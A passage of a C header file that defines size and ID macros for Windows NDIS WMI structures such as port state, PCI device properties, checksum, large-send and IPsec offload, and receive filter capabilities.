#define MSNdis_PortStateData_MediaConnectState_SIZE sizeof(ULONG)
#define MSNdis_PortStateData_MediaConnectState_ID 2
#define MSNdis_PortStateData_XmitLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_PortStateData_XmitLinkSpeed_ID 3
#define MSNdis_PortStateData_RcvLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_PortStateData_RcvLinkSpeed_ID 4
#define MSNdis_PortStateData_Direction_SIZE sizeof(ULONG)
#define MSNdis_PortStateData_Direction_ID 5
#define MSNdis_PortStateData_SendControlState_SIZE sizeof(ULONG)
#define MSNdis_PortStateData_SendControlState_ID 6
#define MSNdis_PortStateData_RcvControlState_SIZE sizeof(ULONG)
#define MSNdis_PortStateData_RcvControlState_ID 7
#define MSNdis_PortStateData_SendAuthorizationState_SIZE sizeof(ULONG)
#define MSNdis_PortStateData_SendAuthorizationState_ID 8
#define MSNdis_PortStateData_RcvAuthorizationState_SIZE sizeof(ULONG)
#define MSNdis_PortStateData_RcvAuthorizationState_ID 9
#define MSNdis_PortStateData_Flags_SIZE sizeof(ULONG)
#define MSNdis_PortStateData_Flags_ID 10

#define MSNdis_PortStateData_SIZE (FIELD_OFFSET(MSNdis_PortStateData, Flags) + MSNdis_PortStateData_Flags_SIZE)

#define MSNdis_PortAuthParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_PortAuthParameters_Header_ID 1
#define MSNdis_PortAuthParameters_SendControlState_SIZE sizeof(ULONG)
#define MSNdis_PortAuthParameters_SendControlState_ID 2
#define MSNdis_PortAuthParameters_RcvControlState_SIZE sizeof(ULONG)
#define MSNdis_PortAuthParameters_RcvControlState_ID 3
#define MSNdis_PortAuthParameters_SendAuthorizationState_SIZE sizeof(ULONG)
#define MSNdis_PortAuthParameters_SendAuthorizationState_ID 4
#define MSNdis_PortAuthParameters_RcvAuthorizationState_SIZE sizeof(ULONG)
#define MSNdis_PortAuthParameters_RcvAuthorizationState_ID 5

#define MSNdis_PortAuthParameters_SIZE (FIELD_OFFSET(MSNdis_PortAuthParameters, RcvAuthorizationState) + MSNdis_PortAuthParameters_RcvAuthorizationState_SIZE)

#define MSNdis_PortChar_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_PortChar_Header_ID 1
#define MSNdis_PortChar_PortNumber_SIZE sizeof(ULONG)
#define MSNdis_PortChar_PortNumber_ID 2
#define MSNdis_PortChar_Flags_SIZE sizeof(ULONG)
#define MSNdis_PortChar_Flags_ID 3
#define MSNdis_PortChar_Type_SIZE sizeof(ULONG)
#define MSNdis_PortChar_Type_ID 4
#define MSNdis_PortChar_MediaConnectState_SIZE sizeof(ULONG)
#define MSNdis_PortChar_MediaConnectState_ID 5
#define MSNdis_PortChar_XmitLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_PortChar_XmitLinkSpeed_ID 6
#define MSNdis_PortChar_RcvLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_PortChar_RcvLinkSpeed_ID 7
#define MSNdis_PortChar_Direction_SIZE sizeof(ULONG)
#define MSNdis_PortChar_Direction_ID 8
#define MSNdis_PortChar_SendControlState_SIZE sizeof(ULONG)
#define MSNdis_PortChar_SendControlState_ID 9
#define MSNdis_PortChar_RcvControlState_SIZE sizeof(ULONG)
#define MSNdis_PortChar_RcvControlState_ID 10
#define MSNdis_PortChar_SendAuthorizationState_SIZE sizeof(ULONG)
#define MSNdis_PortChar_SendAuthorizationState_ID 11
#define MSNdis_PortChar_RcvAuthorizationState_SIZE sizeof(ULONG)
#define MSNdis_PortChar_RcvAuthorizationState_ID 12

#define MSNdis_PortChar_SIZE (FIELD_OFFSET(MSNdis_PortChar, RcvAuthorizationState) + MSNdis_PortChar_RcvAuthorizationState_SIZE)

#define MSNdis_PortArray_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_PortArray_Header_ID 1
#define MSNdis_PortArray_NumberOfPorts_SIZE sizeof(ULONG)
#define MSNdis_PortArray_NumberOfPorts_ID 2
#define MSNdis_PortArray_OffsetFirstPort_SIZE sizeof(ULONG)
#define MSNdis_PortArray_OffsetFirstPort_ID 3
#define MSNdis_PortArray_ElementSize_SIZE sizeof(ULONG)
#define MSNdis_PortArray_ElementSize_ID 4
#define MSNdis_PortArray_Port_ID 5

#define MSNdis_PciDeviceProperty_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_PciDeviceProperty_Header_ID 1
#define MSNdis_PciDeviceProperty_DeviceType_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_DeviceType_ID 2
#define MSNdis_PciDeviceProperty_CurrentSpeedAndMode_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_CurrentSpeedAndMode_ID 3
#define MSNdis_PciDeviceProperty_CurrentPayloadSize_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_CurrentPayloadSize_ID 4
#define MSNdis_PciDeviceProperty_MaxPayloadSize_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_MaxPayloadSize_ID 5
#define MSNdis_PciDeviceProperty_MaxReadRequestSize_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_MaxReadRequestSize_ID 6
#define MSNdis_PciDeviceProperty_CurrentLinkSpeed_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_CurrentLinkSpeed_ID 7
#define MSNdis_PciDeviceProperty_CurrentLinkWidth_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_CurrentLinkWidth_ID 8
#define MSNdis_PciDeviceProperty_MaxLinkSpeed_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_MaxLinkSpeed_ID 9
#define MSNdis_PciDeviceProperty_MaxLinkWidth_SIZE sizeof(ULONG)
#define MSNdis_PciDeviceProperty_MaxLinkWidth_ID 10

#define MSNdis_PciDeviceProperty_SIZE (FIELD_OFFSET(MSNdis_PciDeviceProperty, MaxLinkWidth) + MSNdis_PciDeviceProperty_MaxLinkWidth_SIZE)

#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_Encapsulation_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_Encapsulation_ID 1
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_MaxOffLoadSize_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_MaxOffLoadSize_ID 2
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_MinSegmentCount_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_MinSegmentCount_ID 3
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_TcpOptions_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_TcpOptions_ID 4
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_IpOptions_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_IpOptions_ID 5

#define MSNdis_WmiTcpLargeSendOffloadV1_IPv4_SIZE (FIELD_OFFSET(MSNdis_WmiTcpLargeSendOffloadV1_IPv4, IpOptions) + MSNdis_WmiTcpLargeSendOffloadV1_IPv4_IpOptions_SIZE)

#define MSNdis_WmiTcpLargeSendOffloadV1_WmiIPv4_SIZE sizeof(MSNdis_WmiTcpLargeSendOffloadV1_IPv4)
#define MSNdis_WmiTcpLargeSendOffloadV1_WmiIPv4_ID 1

#define MSNdis_WmiTcpLargeSendOffloadV1_SIZE (FIELD_OFFSET(MSNdis_WmiTcpLargeSendOffloadV1, WmiIPv4) + MSNdis_WmiTcpLargeSendOffloadV1_WmiIPv4_SIZE)

#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_Encapsulation_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_Encapsulation_ID 1
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_IpOptionsSupported_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_IpOptionsSupported_ID 2
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_TcpOptionsSupported_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_TcpOptionsSupported_ID 3
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_TcpChecksum_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_TcpChecksum_ID 4
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_UdpChecksum_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_UdpChecksum_ID 5
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_IpChecksum_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_IpChecksum_ID 6

#define MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_SIZE (FIELD_OFFSET(MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive, IpChecksum) + MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive_IpChecksum_SIZE)

#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_Encapsulation_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_Encapsulation_ID 1
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_IpExtensionHeadersSupported_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_IpExtensionHeadersSupported_ID 2
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_TcpOptionsSupported_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_TcpOptionsSupported_ID 3
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_TcpChecksum_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_TcpChecksum_ID 4
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_UdpChecksum_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_UdpChecksum_ID 5

#define MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_SIZE (FIELD_OFFSET(MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive, UdpChecksum) + MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive_UdpChecksum_SIZE)

#define MSNdis_WmiTcpIpChecksumOffload_IPv4Transmit_SIZE sizeof(MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4Transmit_ID 1
#define MSNdis_WmiTcpIpChecksumOffload_IPv4Receive_SIZE sizeof(MSNdis_WmiTcpIpChecksumOffload_IPv4TransmitReceive)
#define MSNdis_WmiTcpIpChecksumOffload_IPv4Receive_ID 2
#define MSNdis_WmiTcpIpChecksumOffload_IPv6Transmit_SIZE sizeof(MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive)
#define MSNdis_WmiTcpIpChecksumOffload_IPv6Transmit_ID 3
#define MSNdis_WmiTcpIpChecksumOffload_IPv6Receive_SIZE sizeof(MSNdis_WmiTcpIpChecksumOffload_IPv6TransmitReceive)
#define MSNdis_WmiTcpIpChecksumOffload_IPv6Receive_ID 4

#define MSNdis_WmiTcpIpChecksumOffload_SIZE (FIELD_OFFSET(MSNdis_WmiTcpIpChecksumOffload, IPv6Receive) + MSNdis_WmiTcpIpChecksumOffload_IPv6Receive_SIZE)

#define MSNdis_WmiIPSecOffloadV1_Supported_Encapsulation_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_Supported_Encapsulation_ID 1
#define MSNdis_WmiIPSecOffloadV1_Supported_AhEspCombined_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_Supported_AhEspCombined_ID 2
#define MSNdis_WmiIPSecOffloadV1_Supported_TransportTunnelCombined_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_Supported_TransportTunnelCombined_ID 3
#define MSNdis_WmiIPSecOffloadV1_Supported_IPv4Options_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_Supported_IPv4Options_ID 4
#define MSNdis_WmiIPSecOffloadV1_Supported_Flags_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_Supported_Flags_ID 5

#define MSNdis_WmiIPSecOffloadV1_Supported_SIZE (FIELD_OFFSET(MSNdis_WmiIPSecOffloadV1_Supported, Flags) + MSNdis_WmiIPSecOffloadV1_Supported_Flags_SIZE)

#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Md5_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Md5_ID 1
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Sha_1_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Sha_1_ID 2
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Transport_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Transport_ID 3
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Tunnel_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Tunnel_ID 4
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Send_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Send_ID 5
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Receive_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4AH_Receive_ID 6

#define MSNdis_WmiIPSecOffloadV1_IPv4AH_SIZE (FIELD_OFFSET(MSNdis_WmiIPSecOffloadV1_IPv4AH, Receive) + MSNdis_WmiIPSecOffloadV1_IPv4AH_Receive_SIZE)

#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Des_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Des_ID 1
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Reserved_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Reserved_ID 2
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_TripleDes_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_TripleDes_ID 3
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_NullEsp_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_NullEsp_ID 4
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Transport_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Transport_ID 5
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Tunnel_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Tunnel_ID 6
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Send_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Send_ID 7
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Receive_SIZE sizeof(ULONG)
#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_Receive_ID 8

#define MSNdis_WmiIPSecOffloadV1_IPv4ESP_SIZE (FIELD_OFFSET(MSNdis_WmiIPSecOffloadV1_IPv4ESP, Receive) + MSNdis_WmiIPSecOffloadV1_IPv4ESP_Receive_SIZE)

#define MSNdis_WmiIPSecOffloadV1_WmiSupported_SIZE sizeof(MSNdis_WmiIPSecOffloadV1_Supported)
#define MSNdis_WmiIPSecOffloadV1_WmiSupported_ID 1
#define MSNdis_WmiIPSecOffloadV1_WmiIPv4AH_SIZE sizeof(MSNdis_WmiIPSecOffloadV1_IPv4AH)
#define MSNdis_WmiIPSecOffloadV1_WmiIPv4AH_ID 2
#define MSNdis_WmiIPSecOffloadV1_WmiIPv4ESP_SIZE sizeof(MSNdis_WmiIPSecOffloadV1_IPv4ESP)
#define MSNdis_WmiIPSecOffloadV1_WmiIPv4ESP_ID 3

#define MSNdis_WmiIPSecOffloadV1_SIZE (FIELD_OFFSET(MSNdis_WmiIPSecOffloadV1, WmiIPv4ESP) + MSNdis_WmiIPSecOffloadV1_WmiIPv4ESP_SIZE)

#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4_Encapsulation_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4_Encapsulation_ID 1
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4_MaxOffLoadSize_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4_MaxOffLoadSize_ID 2
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4_MinSegmentCount_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4_MinSegmentCount_ID 3

#define MSNdis_WmiTcpLargeSendOffloadV2_IPv4_SIZE (FIELD_OFFSET(MSNdis_WmiTcpLargeSendOffloadV2_IPv4, MinSegmentCount) + MSNdis_WmiTcpLargeSendOffloadV2_IPv4_MinSegmentCount_SIZE)

#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_Encapsulation_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_Encapsulation_ID 1
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_MaxOffLoadSize_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_MaxOffLoadSize_ID 2
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_MinSegmentCount_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_MinSegmentCount_ID 3
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_IpExtensionHeadersSupported_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_IpExtensionHeadersSupported_ID 4
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_TcpOptionsSupported_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_TcpOptionsSupported_ID 5

#define MSNdis_WmiTcpLargeSendOffloadV2_IPv6_SIZE (FIELD_OFFSET(MSNdis_WmiTcpLargeSendOffloadV2_IPv6, TcpOptionsSupported) + MSNdis_WmiTcpLargeSendOffloadV2_IPv6_TcpOptionsSupported_SIZE)

#define MSNdis_WmiTcpLargeSendOffloadV2_WmiIPv4_SIZE sizeof(MSNdis_WmiTcpLargeSendOffloadV2_IPv4)
#define MSNdis_WmiTcpLargeSendOffloadV2_WmiIPv4_ID 1
#define MSNdis_WmiTcpLargeSendOffloadV2_WmiIPv6_SIZE sizeof(MSNdis_WmiTcpLargeSendOffloadV2_IPv6)
#define MSNdis_WmiTcpLargeSendOffloadV2_WmiIPv6_ID 2

#define MSNdis_WmiTcpLargeSendOffloadV2_SIZE (FIELD_OFFSET(MSNdis_WmiTcpLargeSendOffloadV2, WmiIPv6) + MSNdis_WmiTcpLargeSendOffloadV2_WmiIPv6_SIZE)

#define MSNdis_WmiOffload_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiOffload_Header_ID 1
#define MSNdis_WmiOffload_Checksum_SIZE sizeof(MSNdis_WmiTcpIpChecksumOffload)
#define MSNdis_WmiOffload_Checksum_ID 2
#define MSNdis_WmiOffload_LsoV1_SIZE sizeof(MSNdis_WmiTcpLargeSendOffloadV1)
#define MSNdis_WmiOffload_LsoV1_ID 3
#define MSNdis_WmiOffload_IPsecV1_SIZE sizeof(MSNdis_WmiIPSecOffloadV1)
#define MSNdis_WmiOffload_IPsecV1_ID 4
#define MSNdis_WmiOffload_LsoV2_SIZE sizeof(MSNdis_WmiTcpLargeSendOffloadV2)
#define MSNdis_WmiOffload_LsoV2_ID 5
#define MSNdis_WmiOffload_Flags_SIZE sizeof(ULONG)
#define MSNdis_WmiOffload_Flags_ID 6

#define MSNdis_WmiOffload_SIZE (FIELD_OFFSET(MSNdis_WmiOffload, Flags) + MSNdis_WmiOffload_Flags_SIZE)

#define MSNdis_TcpOffloadParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_TcpOffloadParameters_Header_ID 1
#define MSNdis_TcpOffloadParameters_IPv4Checksum_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_IPv4Checksum_ID 2
#define MSNdis_TcpOffloadParameters_TCPIPv4Checksum_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_TCPIPv4Checksum_ID 3
#define MSNdis_TcpOffloadParameters_UDPIPv4Checksum_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_UDPIPv4Checksum_ID 4
#define MSNdis_TcpOffloadParameters_TCPIPv6Checksum_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_TCPIPv6Checksum_ID 5
#define MSNdis_TcpOffloadParameters_UDPIPv6Checksum_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_UDPIPv6Checksum_ID 6
#define MSNdis_TcpOffloadParameters_LsoV1_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_LsoV1_ID 7
#define MSNdis_TcpOffloadParameters_IPsec_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_IPsec_ID 8
#define MSNdis_TcpOffloadParameters_LsoV2IPv4_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_LsoV2IPv4_ID 9
#define MSNdis_TcpOffloadParameters_LsoV2IPv6_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_LsoV2IPv6_ID 10
#define MSNdis_TcpOffloadParameters_TcpConnectionIPv4_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_TcpConnectionIPv4_ID 11
#define MSNdis_TcpOffloadParameters_TcpConnectionIPv6_SIZE sizeof(UCHAR)
#define MSNdis_TcpOffloadParameters_TcpConnectionIPv6_ID 12
#define MSNdis_TcpOffloadParameters_Flags_SIZE sizeof(ULONG)
#define MSNdis_TcpOffloadParameters_Flags_ID 13

#define MSNdis_TcpOffloadParameters_SIZE (FIELD_OFFSET(MSNdis_TcpOffloadParameters, Flags) + MSNdis_TcpOffloadParameters_Flags_SIZE)

#define MSNdis_WmiTcpConnectionOffload_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiTcpConnectionOffload_Header_ID 1
#define MSNdis_WmiTcpConnectionOffload_Encapsulation_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpConnectionOffload_Encapsulation_ID 2
#define MSNdis_WmiTcpConnectionOffload_SupportIp4_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpConnectionOffload_SupportIp4_ID 3
#define MSNdis_WmiTcpConnectionOffload_SupportIp6_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpConnectionOffload_SupportIp6_ID 4
#define MSNdis_WmiTcpConnectionOffload_SupportIp6ExtensionHeaders_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpConnectionOffload_SupportIp6ExtensionHeaders_ID 5
#define MSNdis_WmiTcpConnectionOffload_SupportSack_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpConnectionOffload_SupportSack_ID 6
#define MSNdis_WmiTcpConnectionOffload_TcpConnectionOffloadCapacity_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpConnectionOffload_TcpConnectionOffloadCapacity_ID 7
#define MSNdis_WmiTcpConnectionOffload_Flags_SIZE sizeof(ULONG)
#define MSNdis_WmiTcpConnectionOffload_Flags_ID 8

#define MSNdis_WmiTcpConnectionOffload_SIZE (FIELD_OFFSET(MSNdis_WmiTcpConnectionOffload, Flags) + MSNdis_WmiTcpConnectionOffload_Flags_SIZE)

#define MSNdis_WmiHDSplitCurrentConfig_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiHDSplitCurrentConfig_Header_ID 1
#define MSNdis_WmiHDSplitCurrentConfig_HardwareCapabilities_SIZE sizeof(ULONG)
#define MSNdis_WmiHDSplitCurrentConfig_HardwareCapabilities_ID 2
#define MSNdis_WmiHDSplitCurrentConfig_CurrentCapabilities_SIZE sizeof(ULONG)
#define MSNdis_WmiHDSplitCurrentConfig_CurrentCapabilities_ID 3
#define MSNdis_WmiHDSplitCurrentConfig_HDSplitFlags_SIZE sizeof(ULONG)
#define MSNdis_WmiHDSplitCurrentConfig_HDSplitFlags_ID 4
#define MSNdis_WmiHDSplitCurrentConfig_HDSplitCombineFlags_SIZE sizeof(ULONG)
#define MSNdis_WmiHDSplitCurrentConfig_HDSplitCombineFlags_ID 5
#define MSNdis_WmiHDSplitCurrentConfig_BackfillSize_SIZE sizeof(ULONG)
#define MSNdis_WmiHDSplitCurrentConfig_BackfillSize_ID 6
#define MSNdis_WmiHDSplitCurrentConfig_MaxHeaderSize_SIZE sizeof(ULONG)
#define MSNdis_WmiHDSplitCurrentConfig_MaxHeaderSize_ID 7

#define MSNdis_WmiHDSplitCurrentConfig_SIZE (FIELD_OFFSET(MSNdis_WmiHDSplitCurrentConfig, MaxHeaderSize) + MSNdis_WmiHDSplitCurrentConfig_MaxHeaderSize_SIZE)

#define MSNdis_HDSplitParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_HDSplitParameters_Header_ID 1
#define MSNdis_HDSplitParameters_HDSplitCombineFlags_SIZE sizeof(ULONG)
#define MSNdis_HDSplitParameters_HDSplitCombineFlags_ID 2

#define MSNdis_HDSplitParameters_SIZE (FIELD_OFFSET(MSNdis_HDSplitParameters, HDSplitCombineFlags) + MSNdis_HDSplitParameters_HDSplitCombineFlags_SIZE)

#define MSNdis_WmiReceiveScaleCapabilities_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiReceiveScaleCapabilities_Header_ID 1
#define MSNdis_WmiReceiveScaleCapabilities_CapabilitiesFlags_SIZE sizeof(ULONG)
#define MSNdis_WmiReceiveScaleCapabilities_CapabilitiesFlags_ID 2
#define MSNdis_WmiReceiveScaleCapabilities_NumberOfInterruptMessages_SIZE sizeof(ULONG)
#define MSNdis_WmiReceiveScaleCapabilities_NumberOfInterruptMessages_ID 3
#define MSNdis_WmiReceiveScaleCapabilities_NumberOfReceiveQueues_SIZE sizeof(ULONG)
#define MSNdis_WmiReceiveScaleCapabilities_NumberOfReceiveQueues_ID 4

#define MSNdis_WmiReceiveScaleCapabilities_SIZE (FIELD_OFFSET(MSNdis_WmiReceiveScaleCapabilities, NumberOfReceiveQueues) + MSNdis_WmiReceiveScaleCapabilities_NumberOfReceiveQueues_SIZE)

#define MSNdis_ReceiveFilterCapabilities_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveFilterCapabilities_Header_ID 1
#define MSNdis_ReceiveFilterCapabilities_Flags_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_Flags_ID 2
#define MSNdis_ReceiveFilterCapabilities_EnabledFilterTypes_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_EnabledFilterTypes_ID 3
#define MSNdis_ReceiveFilterCapabilities_EnabledQueueTypes_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_EnabledQueueTypes_ID 4
#define MSNdis_ReceiveFilterCapabilities_NumQueues_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_NumQueues_ID 5
#define MSNdis_ReceiveFilterCapabilities_SupportedQueueProperties_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_SupportedQueueProperties_ID 6
#define MSNdis_ReceiveFilterCapabilities_SupportedFilterTests_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_SupportedFilterTests_ID 7
#define MSNdis_ReceiveFilterCapabilities_SupportedHeaders_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_SupportedHeaders_ID 8
#define MSNdis_ReceiveFilterCapabilities_SupportedMacHeaderFields_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_SupportedMacHeaderFields_ID 9
#define MSNdis_ReceiveFilterCapabilities_MaxMacHeaderFilters_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_MaxMacHeaderFilters_ID 10
#define MSNdis_ReceiveFilterCapabilities_MaxQueueGroups_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_MaxQueueGroups_ID 11
#define MSNdis_ReceiveFilterCapabilities_MaxQueuesPerQueueGroup_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_MaxQueuesPerQueueGroup_ID 12
#define MSNdis_ReceiveFilterCapabilities_MinLookaheadSplitSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_MinLookaheadSplitSize_ID 13
#define MSNdis_ReceiveFilterCapabilities_MaxLookaheadSplitSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterCapabilities_MaxLookaheadSplitSize_ID 14

#define MSNdis_ReceiveFilterCapabilities_SIZE (FIELD_OFFSET(MSNdis_ReceiveFilterCapabilities, MaxLookaheadSplitSize) + MSNdis_ReceiveFilterCapabilities_MaxLookaheadSplitSize_SIZE)

#define MSNdis_ReceiveFilterGlobalParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveFilterGlobalParameters_Header_ID 1
#define MSNdis_ReceiveFilterGlobalParameters_Flags_SIZE sizeof(ULONG)
